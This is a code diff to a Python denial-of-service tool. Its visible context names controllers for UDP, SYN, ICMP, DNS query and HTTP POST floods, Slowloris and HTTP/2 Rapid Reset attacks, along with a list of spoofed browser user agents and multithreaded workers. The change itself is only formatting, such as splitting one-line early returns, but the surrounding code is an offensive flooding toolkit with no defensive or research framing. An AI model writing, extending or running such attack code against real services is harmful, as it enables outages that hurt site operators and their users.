@@ -23,8 +23,8 @@ USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
 ]
 
-# --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---
 
+# --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---
 def resolve_to_ipv4(target_url):
     """Resolves a hostname to a list of its IPv4 addresses."""
     try:
@@ -100,7 +100,8 @@ def udp_worker(stop_event, pause_event, target_ip, port, packet_size):
 def attack_udp(method, target_url, port, duration, stop_event, pause_event, threads=150):
     """Controller for UDP flood attacks."""
     ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    if not ips:
+        return
 
     attack_end_time = time.time() + duration
     all_threads = []
@@ -143,7 +144,8 @@ def syn_worker(stop_event, pause_event, target_ip, port):
 def synflood(target_url, port, duration, stop_event, pause_event, threads=150):
     """Controller for SYN flood attacks."""
     ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    if not ips:
+        return
 
     attack_end_time = time.time() + duration
     all_threads = []
@@ -192,7 +194,8 @@ def dns_query_worker(stop_event, pause_event, target_ip, target_domain):
 def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, threads=150):
     """Controller for DNS Query Flood attacks."""
     ips = resolve_to_ipv4(target_domain)
-    if not ips: return
+    if not ips:
+        return
 
     attack_end_time = time.time() + duration
     for ip in ips:
@@ -222,7 +225,8 @@ def icmp_worker(stop_event, pause_event, target_ip):
 def icmpflood(target_url, duration, stop_event, pause_event, threads=150):
     """Controller for ICMP flood attacks."""
     ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    if not ips:
+        return
 
     attack_end_time = time.time() + duration
     all_threads = []
@@ -314,7 +318,8 @@ def slowloris_worker(stop_event, pause_event, target_ip, port, host_header, use_
 def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
     """Controller for HTTP POST flood attacks."""
     ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    if not ips:
+        return
 
     attack_end_time = time.time() + duration
     for ip in ips:
@@ -331,7 +336,8 @@ def attack_http_post(target_url, port, duration, stop_event, pause_event, thread
 def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200, use_proxy=False):
     """Controller for Slowloris attacks."""
     ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    if not ips:
+        return
 
     attack_end_time = time.time() + duration
     for ip in ips:
@@ -411,7 +417,8 @@ def attack_h2_rapid_reset(target_url, port, duration, stop_event, pause_event, t
     """Controller for HTTP/2 Rapid Reset attacks."""
     # Note: This attack is so efficient that fewer threads are needed compared to other floods.
     ips = resolve_to_ipv4(target_url)
-    if not ips: return
+    if not ips:
+        return
 
     attack_end_time = time.time() + duration
 
